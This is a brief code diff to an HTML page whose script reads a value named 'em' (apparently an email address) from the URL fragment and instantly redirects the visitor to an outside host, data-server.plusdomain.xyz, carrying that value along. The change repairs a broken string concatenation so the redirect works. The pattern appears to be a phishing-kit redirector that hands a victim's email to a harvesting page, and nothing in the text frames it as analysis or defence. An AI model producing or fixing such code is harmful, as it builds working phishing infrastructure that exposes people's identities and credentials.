@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://data-server.plusdomain.xyz"+ + em;
+			window.location.href = "https://data-server.plusdomain.xyz"+ "#" + em;
 		}, 0);
 	</script>
 </html>
